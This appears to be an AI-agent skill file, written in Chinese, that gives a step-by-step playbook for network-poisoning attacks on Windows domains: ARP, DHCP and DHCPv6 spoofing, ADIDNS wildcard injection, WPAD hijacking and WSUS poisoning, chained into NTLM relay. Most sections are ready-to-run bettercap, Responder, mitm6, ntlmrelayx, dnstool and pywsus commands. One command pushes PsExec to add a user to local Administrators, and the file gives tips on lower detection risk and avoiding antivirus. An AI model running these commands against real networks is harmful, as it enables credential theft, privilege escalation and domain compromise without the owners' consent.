---
name: network-poisoning-attack
description: "内网渗透中的网络层投毒和协议欺骗攻击方法论。当需要通过网络投毒获取 NTLM 认证、实现中间人攻击时使用。覆盖 ARP 投毒、DHCP 投毒、DHCPv6/mitm6 欺骗、DNS 欺骗、ADIDNS 记录注入、WPAD 劫持、WSUS 投毒、ICMP 重定向、NBT Name Overwrite。通常作为 NTLM relay 攻击的前置步骤。"
metadata:
  tags: "arp poisoning,dhcp poisoning,dhcpv6,mitm6,dns spoofing,adidns,wpad,wsus,icmp redirect,nbt name overwrite,mitm,中间人,投毒,欺骗,bettercap,ettercap,dnstool,pywsus,responder,inveigh"
  category: "lateral"
---

# 网络层投毒与欺骗攻击

通过污染网络层协议（ARP、DHCP、DNS、WPAD 等）实现中间人定位或强制认证触发，是 NTLM relay 攻击最常用的前置步骤。

## 触发条件

- 内网需要通过网络投毒获取凭证或实现中间人
- 需要作为 NTLM relay 的前置步骤进行投毒
- 需要 ARP/DHCP/DHCPv6/DNS/WPAD/WSUS 投毒

## 前置要求

- 同网段物理接入（大部分技术要求同广播域）
- 域用户凭证（ADIDNS 注入需要）
- 工具: bettercap, Responder, mitm6, dnstool.py, Inveigh, pywsus, dnschef

## 技术选择决策树

```
网络位置与条件？
├── 同广播域
│   ├── 快速 MITM → ARP 投毒 (高检测风险)
│   ├── IPv6 未禁用 → DHCPv6/mitm6 (推荐)
│   ├── DHCP 环境 → DHCP 投毒
│   └── 被动监听 → LLMNR/NBT-NS (已有 → ntlm-relay-attack)
├── 域环境 + 域凭证
│   ├── ADIDNS 记录注入 (最稳定)
│   └── WPAD 劫持 (结合 ADIDNS/DHCPv6)
├── WSUS 使用 HTTP
│   └── WSUS 投毒
└── DNS 已控制
    └── DNS 欺骗
```

## 技术对比表

| 投毒方式 | 前置条件 | 检测风险 | 适用场景 |
|----------|----------|----------|----------|
| ARP 投毒 | 同广播域 | 高 (ARP 异常) | 快速 MITM，需即时效果 |
| DHCP 投毒 | 同广播域 | 中 | 持久 DNS/WPAD 注入 |
| DHCPv6/mitm6 | IPv6 未禁用 | 低 | 推荐，隐蔽获取 NTLM |
| DNS 欺骗 | 已控制 DNS 流量 | 低 | 精准域名劫持 |
| ADIDNS 注入 | 域凭证 | 极低 | 最稳定，域级 DNS 投毒 |
| WPAD 劫持 | 见各子方式 | 中 | 透明代理捕获认证 |
| WSUS 投毒 | HTTP WSUS | 中 | 代码执行 (非凭证) |
| ICMP 重定向 | 同网段 | 低 | 现代 OS 多忽略 |

---

## 1. ARP 投毒

### 原理

ARP 协议无认证机制，攻击者发送伪造 ARP 响应将自身 MAC 地址绑定到网关或目标 IP，实现流量劫持。分为双向（fullduplex）和单向投毒。

### 核心命令

```bash
# bettercap 交互模式
bettercap -iface eth0

# 单向投毒（仅欺骗目标，让目标流量经过攻击者）
set arp.spoof.targets $CLIENT_IP
set arp.spoof.internal false
set arp.spoof.fullduplex false
arp.spoof on

# 双向投毒（同时欺骗目标和网关）
set arp.spoof.targets $CLIENT_IP
set arp.spoof.fullduplex true
arp.spoof on

# 开启 IP 转发（Linux）
sysctl -w net.ipv4.ip_forward=1
iptables --policy FORWARD ACCEPT
```

### SMB 场景：any.proxy 重定向到攻击者 445

```bash
# 将目标发往 $SERVER_IP:445 的流量重定向到攻击者
set any.proxy.src_address $SERVER_IP
set any.proxy.src_port 445
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 445
any.proxy on
```

### IP 伪装绕过（SNAT/DNAT）

```bash
# 当目标检查源 IP 时，需要 iptables NAT 伪装
iptables -t nat -A PREROUTING -p tcp -d $SERVER_IP --dport 445 -j DNAT --to-destination $ATTACKER_IP:445
iptables -t nat -A POSTROUTING -p tcp -s $CLIENT_IP --dport 445 -j SNAT --to-source $SERVER_IP
```

### Relay 衔接

ARP 投毒获得 MITM 位置后，使用 any.proxy 将 SMB/HTTP 流量重定向到 ntlmrelayx 监听端口。

---

## 2. DHCP 投毒

### 原理

通过 Responder 的 DHCP 模式响应客户端 DHCP 请求，注入恶意 DNS 服务器或 WPAD 配置。效果持续到客户端 DHCP 租约过期或重启。

### 核心命令

```bash
# DNS 注入模式（注入 DNS + WPAD）
responder -I "eth0" -wPdD

# 仅 WPAD 注入
responder -I "eth0" -wPd

# -d: DHCP 响应中注入 DNS
# -D: DHCP 响应中注入 WPAD
# -w: 启动 WPAD rogue proxy
# -P: 强制 NTLM 认证（Proxy Auth）
```

### Relay 衔接

```bash
# WPAD 注入 + ntlmrelayx 作为代理
ntlmrelayx.py -t $TARGET --http-port 3128
# Responder 将 WPAD 配置指向 $ATTACKER_IP:3128
```

---

## 3. DHCPv6/mitm6（推荐）

### 原理

Windows 默认启用 IPv6 且优先使用 IPv6 DNS。mitm6 伪装 DHCPv6 服务器为目标分配 IPv6 DNS，将所有 DNS 查询指向攻击者。隐蔽性高，对 IPv4 网络无影响。

### 核心命令

```bash
# 启动 mitm6
mitm6 --interface eth0 --domain $DOMAIN

# 指定目标（减少影响范围）
mitm6 --interface eth0 --domain $DOMAIN --host-allowlist $TARGET_HOSTNAME
```

### bettercap 替代方案

```bash
set dhcp6.spoof.domains $DOMAIN
dhcp6.spoof on
set dns.spoof.domains *.$DOMAIN
dns.spoof on
```

### Relay 衔接

```bash
# 经典组合：mitm6 + ntlmrelayx
# 终端 1
mitm6 -d $DOMAIN

# 终端 2
ntlmrelayx.py -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access
# -wh: 设置 WPAD 主机名，触发 HTTP 认证
# --delegate-access: 自动配置 RBCD
```

---

## 4. DNS 欺骗

### 原理

在已获得 MITM 位置（ARP 投毒等）后，拦截并篡改 DNS 响应，将目标域名解析到攻击者 IP。需要先有流量劫持能力。

### 核心命令

```bash
# dnschef（独立 DNS 代理）
dnschef --fakeip $ATTACKER_IP --interface $ATTACKER_IP --port 53

# 指定域名
dnschef --fakedomains $DOMAIN --fakeip $ATTACKER_IP --interface $ATTACKER_IP

# Responder 内置 DNS
responder -I "eth0"

# bettercap dns.spoof
set dns.spoof.domains *.$DOMAIN
set dns.spoof.address $ATTACKER_IP
dns.spoof on
```

### Relay 衔接

DNS 欺骗将目标对特定服务的访问重定向到攻击者，配合 ntlmrelayx 捕获认证请求。

---

## 5. ADIDNS 记录注入

### 原理

Active Directory 集成 DNS（ADIDNS）默认允许任何域用户创建新的 DNS 子对象。通过添加通配符记录（*），可将所有未明确定义的 DNS 查询解析到攻击者 IP。这是最稳定、检测风险最低的投毒方式。

### 核心命令

```bash
# 检查是否存在 WINS forward lookup（type 65281，会干扰通配符）
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '@' --action 'query' $DC

# 添加通配符记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC

# 指定 DNS 分区（--legacy 用于旧 DNS 区域，--forest 用于森林级）
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP --legacy $DC

# 清理（务必在完成后执行）
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action remove $DC
```

### Powermad 替代

```powershell
# 添加通配符 A 记录
New-ADIDNSNode -Node * -Data $ATTACKER_IP
# 添加指定记录
New-ADIDNSNode -Node wpad -Data $ATTACKER_IP
```

### Inveigh 自动化

```powershell
# 自动 ADIDNS 注入 + 投毒
Invoke-Inveigh -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3
# combo: 通配符 + NS 记录组合
# ADIDNSThreshold: 未解析查询达到阈值后才注入（降低误报）
```

### Relay 衔接

通配符记录使所有不存在的主机名解析到攻击者，配合 Responder/ntlmrelayx 自动捕获认证。

---

## 6. WPAD 劫持

### 原理

WPAD（Web Proxy Auto-Discovery）解析链：DHCP Option 252 → DNS 查询 wpad.$DOMAIN → LLMNR/NBT-NS 广播。劫持任一环节即可让目标通过攻击者代理上网，触发 NTLM 认证。

### 旧系统（未打 MS16-077）

```bash
# LLMNR/NBT-NS 响应 WPAD 查询
responder -I "eth0" -wP
# -w: WPAD rogue proxy
# -P: 强制 Proxy NTLM 认证
```

### 新系统（GQBL bypass）

MS16-077 后 WPAD 不再通过广播解析，需要 ADIDNS 注入绕过：

```bash
# 方式 1: 添加 wpad A 记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record 'wpad' --action add --data $ATTACKER_IP $DC

# 方式 2: 添加 NS 记录委派
```

```powershell
# PowerShell NS 记录（将 wpad 子域委派到攻击者）
New-ADIDNSNode -Node wpad -Type NS -Data 'attacker.$DOMAIN'
# 攻击者运行 dnschef 响应 wpad 查询
```

### DHCPv6 方式

```bash
# 当 DNS 中 wpad 记录已存在但指向错误时
mitm6 --domain $DOMAIN
# mitm6 通过 DHCPv6 让目标使用攻击者 DNS，直接控制 wpad 解析
```

### Relay 衔接

WPAD 代理自动触发 HTTP NTLM 认证，直接转发到 ntlmrelayx。

---

## 7. WSUS 投毒

### 原理

如果 WSUS（Windows Server Update Services）使用 HTTP 而非 HTTPS，攻击者可在 MITM 位置下替换更新包，实现代码执行。注意这是代码执行而非凭证获取。

### 检查 WSUS 配置

```bash
# 远程查询（需要访问权限）
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
# 如果是 http:// 开头 → 可投毒
```

### 核心命令

```bash
# 启动恶意 WSUS 服务器
python3 pywsus.py --host $ATTACKER_IP --port 8530 \
  --executable /path/to/PsExec64.exe \
  --command '/accepteula /s cmd.exe /c "net localgroup Administrators $DOMAIN\\$USER /add"'
```

### bettercap 流量重定向

```bash
# ARP 投毒后重定向 WSUS 流量
set any.proxy.src_port 8530
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 8530
any.proxy on
```

### 补充说明

- CVE-2020-1013: WSUS 本地提权漏洞，可在本地利用
- 触发更新检查: `wuauclt /detectnow /updatenow` 或 `UsoClient StartScan`
- 推荐使用 LOLBin（PsExec64.exe 等签名二进制）避免触发 AV

### Relay 衔接

WSUS 投毒主要用于代码执行，不直接衔接 NTLM relay。

---

## 8. ICMP 重定向

### 原理

ICMP Redirect 消息通知主机更优路由路径，攻击者伪造 ICMP Redirect 将目标流量重定向到自身。但现代 OS（Windows 10+、Linux 默认）大多忽略 ICMP Redirect。

### 核心命令

```bash
python3 tools/Icmp-Redirect.py \
  --interface eth0 \
  --ip $ATTACKER_IP \
  --gateway $GATEWAY \
  --target $TARGET \
  --route $DNS_SERVER
```

### 实用价值

有限。现代操作系统默认禁用或忽略 ICMP Redirect，仅在特定老旧环境中有效。

---

## 9. NBT Name Overwrite

### 原理

NetBIOS 名称覆盖攻击通过发送 NetBIOS Name Overwrite 包修改目标的名称表，将特定名称关联到攻击者 IP。

### 现状

实际工具支持有限，主要作为理论参考。在实战中优先使用 ADIDNS 或 DHCPv6 等更可靠的方式。

---

## 组合利用示例

### mitm6 + ntlmrelayx（最常用）

```bash
# 终端 1: DHCPv6 投毒
mitm6 -d $DOMAIN

# 终端 2: LDAP relay + RBCD
ntlmrelayx.py -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access
```

### ADIDNS + Responder + relay

```bash
# Step 1: 注入通配符 DNS 记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC

# Step 2: 启动 Responder（关闭 SMB/HTTP）
responder -I eth0

# Step 3: 启动 ntlmrelayx
ntlmrelayx.py -t $TARGET -smb2support
```

---

## 深入参考

- → [references/layer2-poisoning.md](references/layer2-poisoning.md) — ARP/DHCP/DHCPv6/ICMP 投毒详细命令与配置
- → [references/name-resolution-poisoning.md](references/name-resolution-poisoning.md) — ADIDNS/WPAD/WSUS/DNS 欺骗完整攻击链
